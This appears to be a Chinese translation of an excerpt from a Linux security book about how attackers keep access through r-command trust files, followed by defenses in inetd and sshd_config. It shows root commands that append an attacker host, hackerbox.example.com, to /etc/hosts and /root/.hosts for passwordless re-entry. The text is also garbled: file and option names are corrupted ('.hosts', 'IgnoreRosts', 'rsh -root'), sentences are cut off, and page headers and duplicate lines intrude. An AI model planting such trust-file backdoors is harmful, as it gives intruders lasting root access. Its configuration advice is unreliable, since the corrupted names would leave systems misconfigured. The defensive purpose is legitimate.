
`uid=0(root) gid=0(root) groups=0(root), 1(bin), 2(daemon), 3(sys), 4(adm), 10(wheel)`

`hackedmachine# echo 'hackerbox.example.com me' >> /etc/hosts`

```bash
# 黑客从他的机器连接

hackerbox$ hostname

hackerbox.example.com

hackerbox$ id

uid=100(me) gid=100(users) groups=100

hackerbox$ login -l someuser hackedmachine

hackedmachine$ id

uid=500(someuser) gid=500(staff) groups=500(staff), 501(web)
```

> 在 `.hosts.equiv` 文件中包含用户名允许用户以 `hackedmachine` 上的任何用户身份登录。如果他没有包含用户名，黑客将只能在两个系统上使用相同的用户名登录。这并不是真正的阻碍，因为黑客可以在他的机器上创建任何他喜欢的用户名。

可能以 `root` 身份访问时不会遵守 `.hosts.equiv` 文件：

```bash
hackerbox$ rsh -root hackedmachine id

Permission denied.

hackerbox$ login -root hackedmachine

Password:
```

## 第10章：黑客如何维持访问

所以你可以看到，通过 `hosts.equiv` 文件无法在密码的情况下登录 `root` 账户。

## `hosts` 修改

| 流行度 | 9 |
| :--- | :--- |
| 简单性 | 10 |
| 影响 | 9 |
| 风险评分 | 9 |

所有 Linux 用户都可以在其家目录下创建一个 `.hosts` 文件，允许他们指定哪些机器上的哪些用户可以无密码登录他们的账户。这与 `/etc/hosts.equiv` 文件直接类比，但它是基于用户的，而不是基于主机的。

因此，黑客可以通过按照自己的意愿创建这些 `.hosts` 文件，让自己获得对特定账户（或账户）的即时访问权限：

```bash
# 将黑客的位置添加到 root 的 hosts 文件

hackedmachine# id

uid=0(root) gid=0(root) groups=0-(root),1(bin),2(daemon),3(sys),4(adm),10(wheel)

hackedmachine# echo 'hackerbox.example.com me' >> /root/.hosts

# 黑客从他的机器连接

hackerbox$ hostname

hackerbox.example.com

hackerbox$ id

uid=1000(me) gid=1000(users) groups=10(users)

hackerbox$ login -root hackedmachine

hackedmachine# id

uid=0(root) gid=0(root) groups=0-(root),1(bin),2(daemon),3(sys),4(adm),10(wheel)
```

与 `hosts.equiv` 不同，`.hosts` 文件允许以 `root` 身份登录，使得它们非常危险，因此对黑客更具吸引力。

## `r`-命令防御措施

应该配置文件完整性工具来监控 `/etc/hosts.equiv` 和所有用户的 `.hosts` 文件。这样做可以在发生任何更改时通知你。

> 尽管你可能想简单地删除这些文件，但最好是让它们存在且为空，并使用 `chattr +i` 将它们设为不可变。一些常见的脚本小子漏洞尝试追加或创建这些文件，这样做有助于防御这些攻击。

## 破解 Linux 揭秘：Linux 安全机密与解决方案

然而，更好的解决方案是完全关闭 `r`-命令。在 `/etc/inetd.conf` 中注释掉以下行：

```conf
shell stream tcp  ncwait root      /usr/sbin/tcpd  in.rsh

login stream tcp  ncwait root      /usr/sbin/tcpd  in.rlogind

exec   stream tcp  ncwait root      /usr/sbin/tcpd  in.rexed
```

一旦重启 `inetd`（例如使用 `killall -HUP inetd`），你的机器将不再响应 `login/rsh/rpc`，且 `hosts.equiv` 和 `.hosts` 文件的内容将被忽略。

## 使用 SSH 进行带密码登录

SSH 的编写是为了作为 `r`-命令的安全替代品。它通过加密保护网络上的数据，并包含了各种认证机制和功能。SSH 有三个主要版本：

- Ssh1：原始版本使用了。
- Ssh2：下一个版本扩展了。
- OpenSSH：OpenSSH 可于在几个。

我们专注于 OpenSSH，因为它是你的...封装的唯一版本。

## 第10章：黑客如何维持访问

## `hosts.equiv` 和 `hosts` 修改

| 流行度 | 8 |
| :--- | :--- |
| 简单性 | 9 |
| 影响 | 10 |
| 风险评分 | 9 |

## Ssh `hosts` 文件防御措施

在 `/etc/ssh/sshd_config` 文件中可以设置三个配置变量，决定你希望支持哪些版本的 `.hosts` 和 `hosts.equiv` 兼容性：

- `RshAuthentication`：只有当机器/用户在 `hosts.equiv` 或 `hosts` 文件列出，且机器密钥与本地存储的主机密钥匹配时，才允许无密码访问。

## 328 破解 Linux 揭秘：Linux 安全秘密与解决方案

| | |
| :--- | :--- |
| `RhostsAuthentication` | 与 `r`-commands 兼容。不进行密钥检查。强烈不建议。 |
| `IgnoreRosts` | 忽略用户的 `.rosts` 和 `.shosts` 文件。允许你启用 `/etc/{s}hosts.equiv`，而不会允许用户在自己那里创建额外的无密码访问。 |

每个变量接受 `yes` 或 `no` 值。决定你希望支持这些无密码访问方法中的哪些，并编辑你的 `/etc/sshd_config` 文件以匹配。要禁用它们，请将这些行改为：

```
RSAAuthentication no

RhostsAuthentication no

IgnoreRosts yes
```

当你安装了 Ssh 后，你应该用文件完整性工具监控的文件列表包括以下所有：

```
/etc/shosts.equiv

/etc/shosts.equiv

/home/*/.rosts

/home/*/.shosts

/etc/ssh_config

/etc/ssh_known_hosts
```
